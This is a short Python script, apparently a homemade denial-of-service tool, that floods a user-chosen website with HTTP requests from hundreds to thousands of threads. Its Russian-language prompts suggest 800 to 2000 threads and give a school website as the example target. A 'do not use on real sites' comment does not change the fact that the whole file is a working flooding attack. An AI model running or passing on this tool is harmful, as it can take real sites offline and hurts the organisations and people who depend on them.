import threading
import requests
import datetime

print("made by shia\n\n")

def ddos_attack(target_url, num_requests):
    try:
        for _ in range(num_requests):
            response = requests.get(target_url)
            if response.status_code==200:
                now = datetime.datetime.now()
                print(f"{now.time()}:  Request sent - Status code: {response.status_code} -- -- -- ПОДКЛЮЧЕНИЕ УСПЕШНО")
    except Exception as e:
        now = datetime.datetime.now()
        print(f"{now.time()}:  Error: {e}")
now = datetime.datetime.now()
ssite=input(f'{now.time()}:  Ссылка на сайт (например http://sch3.bereza.edu.by/)-->')
now = datetime.datetime.now()
threads_count=int(input(f'{now.time()}:  Значение threads_count (желательно 800, 1200, 2000)--> '))
requests_per_thread = threads_count*2


if __name__ == "__main__":
    target = ssite  # Не используйте на реальных сайтах!

    threads = []
    for _ in range(threads_count):
        thread = threading.Thread(target=ddos_attack, args=(target, requests_per_thread))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()